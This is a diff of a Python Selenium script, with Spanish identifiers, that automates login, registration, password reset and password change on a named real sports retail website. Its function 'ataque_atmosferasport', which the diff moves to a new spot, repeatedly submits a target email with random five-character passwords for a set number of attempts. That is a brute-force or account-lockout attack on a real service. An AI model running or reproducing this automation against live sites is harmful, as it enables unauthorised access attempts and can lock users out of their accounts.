@@ -97,46 +97,6 @@ def ataque_spider(correo, intentos):
     time.sleep(5)
     driver.quit()
 
-def ataque_atmosferasport(correo, intentos):
-
-    driver.maximize_window()
-    letters = string.ascii_letters
-    numbers = string.digits
-    driver.get("https://www.atmosferasport.es/inicio-sesion")
-    time.sleep(5)
-    try:
-        clk = driver.find_element_by_xpath("//*[@id='authentication']/div[6]/div/div/a").click()
-    except:
-        print("")
-    usuario = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[3]/div[1]/form/div/div[1]/input")
-    usuario.clear()
-    usuario.send_keys(correo)
-    passwd = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[3]/div[1]/form/div/div[2]/input")
-    passwd.clear()
-    pw_in = ''.join(random.choice(letters+numbers) for j in range(5))
-    passwd.send_keys(pw_in)
-    clk = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[3]/div[1]/form/div/p[2]/button").click()
-    time.sleep(5)
-    for i in range(intentos-1):
-        usuario = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[4]/div[1]/form/div/div[1]/input")
-        usuario.clear()
-        usuario.send_keys(correo)
-        passwd = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[4]/div[1]/form/div/div[2]/input")
-        passwd.clear()
-        pw_in = ''.join(random.choice(letters+numbers) for j in range(5))
-        passwd.send_keys(pw_in)
-        clk = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[4]/div[1]/form/div/p[2]/button").click()
-        time.sleep(2)
-    time.sleep(5)
-    driver.quit()
-
-
-def reestablecer_atmosferasport(correo):
-    driver.maximize_window()
-    driver.get("https://www.atmosferasport.es/recuperacion-contrasena")
-    
-    #clk = driver.find_element_by_xpath('///*[@id="form_forgotpassword"]/fieldset/p/button').click()
-
 def registro_atmosferasport(correo):
     driver.maximize_window()
     letters = string.ascii_letters
@@ -174,3 +134,79 @@ def registro_atmosferasport(correo):
 
     clk = driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[3]/div[2]/form/div/div[2]/button').click()
     return correo, pw_in
+
+def inicio_atmosferasport(correo, pw):
+    driver.maximize_window()
+    driver.get('https://www.atmosferasport.es/inicio-sesion')
+    time.sleep(5)
+    try:
+        clk = driver.find_element_by_xpath('//*[@id="authentication"]/div[6]/div/div/a').click()
+    except:
+        print("")
+    usuario = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[3]/div[1]/form/div/div[1]/input")
+    usuario.clear()
+    usuario.send_keys(correo)
+    passwd = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[3]/div[1]/form/div/div[2]/input")
+    passwd.clear()
+    passwd.send_keys(pw)
+    clk = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[3]/div[1]/form/div/p[2]/button").click()
+    time.sleep(5)
+
+def reestablecer_atmosferasport(correo):
+    driver.maximize_window()
+    driver.get("https://www.atmosferasport.es/recuperacion-contrasena")
+    email = driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div/div/div/div/div/form/fieldset/div/div/input')
+    email.send_keys(correo)
+    clk = driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div/div/div/div/div/form/fieldset/p/button').click()
+
+def cambiarPW_atmosferasport(correo, pw):
+    letters = string.ascii_letters
+    numbers = string.digits
+    inicio_atmosferasport(correo, pw)
+    driver.get('https://www.atmosferasport.es/datos-personales')
+    clk = driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div/div/div/div[2]/div[2]/div[3]/a[2]').click()
+    time.sleep(1)
+    pw_a = driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div/div/div/div[2]/form/fieldset/div[9]/div/input')
+    pw_a.clear()
+    pw_a.send_keys(pw)
+    pw_in = ''.join(random.choice(letters+numbers) for j in range(5))
+    pw_n = driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div/div/div/div[2]/form/fieldset/div[10]/div/input')
+    pw_n.send_keys(pw_in)
+    pw_confirm = driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div/div/div/div[2]/form/fieldset/div[11]/div/input')
+    pw_confirm.send_keys(pw_in)
+    clk = driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div/div/div/div[2]/form/fieldset/div[12]/div/button').click()
+    return pw_in
+
+def ataque_atmosferasport(correo, intentos):
+
+    driver.maximize_window()
+    letters = string.ascii_letters
+    numbers = string.digits
+    driver.get("https://www.atmosferasport.es/inicio-sesion")
+    time.sleep(5)
+    try:
+        clk = driver.find_element_by_xpath("//*[@id='authentication']/div[6]/div/div/a").click()
+    except:
+        print("")
+    usuario = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[3]/div[1]/form/div/div[1]/input")
+    usuario.clear()
+    usuario.send_keys(correo)
+    passwd = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[3]/div[1]/form/div/div[2]/input")
+    passwd.clear()
+    pw_in = ''.join(random.choice(letters+numbers) for j in range(5))
+    passwd.send_keys(pw_in)
+    clk = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[3]/div[1]/form/div/p[2]/button").click()
+    time.sleep(5)
+    for i in range(intentos-1):
+        usuario = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[4]/div[1]/form/div/div[1]/input")
+        usuario.clear()
+        usuario.send_keys(correo)
+        passwd = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[4]/div[1]/form/div/div[2]/input")
+        passwd.clear()
+        pw_in = ''.join(random.choice(letters+numbers) for j in range(5))
+        passwd.send_keys(pw_in)
+        clk = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div/div/div[2]/div[4]/div[1]/form/div/p[2]/button").click()
+        time.sleep(2)
+    time.sleep(5)
+    driver.quit()
+
